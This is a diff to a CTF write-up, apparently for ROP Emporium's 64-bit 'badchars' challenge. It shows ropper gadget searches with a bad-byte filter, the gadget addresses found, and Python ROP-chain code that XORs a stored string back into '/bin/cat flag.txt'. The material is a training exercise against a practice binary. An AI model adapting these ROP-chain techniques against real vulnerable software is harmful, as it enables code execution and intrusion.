@@ -66,15 +66,21 @@ ropper --search $QUERY -b 6269632f20666e73 #-b is bad bytes and the number is al
 
 #### Loading the String
 
-Searching by `mov qword` we get
+Searching by `mov qword` we get mov whats in r12 into the memory address stored in r13
 
 ```
+ropper --search "mov qword" -b 6269632f20666e73
+
 0x0000000000400b34: mov qword ptr [r13], r12; ret;
 ```
+
+Now we need to load data into r12 and r13
 
 Searching for `pop r12` we get:
 
 ```
+ropper --search "pop r12" -b 6269632f20666e73
+
 0x0000000000400b3b: pop r12; pop r13; ret;
 ```
 
@@ -109,5 +115,51 @@ Test and get this part working before moving on.
 
 #### Modifing the String
 
-Now that the string is load
+Now that the string is loaded into memory we can modify it back to it's original state
 
+We'll use that `usefulGadget` we found from before
+```
+xor byte ptr [r15], r14b; ret;
+```
+
+But we need to find a way to load data into r15 and r14
+```
+ropper --search "pop r14" -b 6269632f20666e73
+
+0x0000000000400b40: pop r14; pop r15; ret;
+```
+
+Now we just need to make a ropchain with the previously used key to xor the string back to `/bin/cat flag.txt`
+
+CODE:
+```
+key = "D".ljust(8,"\x00").encode() #left justfied so it becomes 8 bytes in length "D\x00\x00\x00\x00\x00\x00\x00"
+pop_r14_r15 = p64(0x400b40)
+xor_r15_r14b = p64(0x400b30)
+
+# 'D' ^ '/'
+xor_str_0 = pop_r14_r15 + key + p64(data_start) + xor_r15_r14b
+# 'D' ^ 'b'
+xor_str_1 = pop_r14_r15 + key + p64(data_start+0x1) + xor_r15_r14b
+# 'D' ^ 'i'
+xor_str_2 = pop_r14_r15 + key + p64(data_start+0x2) + xor_r15_r14b
+# 'D' ^ 'n'
+xor_str_3 = pop_r14_r15 + key + p64(data_start+0x3) + xor_r15_r14b
+# 'D' ^ '/'
+xor_str_4 = pop_r14_r15 + key + p64(data_start+0x4) + xor_r15_r14b
+# 'D' ^ 'c'
+xor_str_5 = pop_r14_r15 + key + p64(data_start+0x5) + xor_r15_r14b
+xor_cat = xor_str_0 + xor_str_1 + xor_str_2 + xor_str_3 + xor_str_4 + xor_str_5
+
+# 'D' ^ ' '
+xor_str_8 = pop_r14_r15 + key + p64(data_start+0x8) + xor_r15_r14b
+# 'D' ^ 'f'
+xor_str_9 = pop_r14_r15 + key + p64(data_start+0x9) + xor_r15_r14b
+xor_flag = xor_str_8 + xor_str_9
+
+xor_str = xor_cat + xor_flag
+```
+
+Once again run and test this stage of the exploit before moving on. The less to debug is always better.
+
+![modified string](imgs/64bit/modifiedString.png)
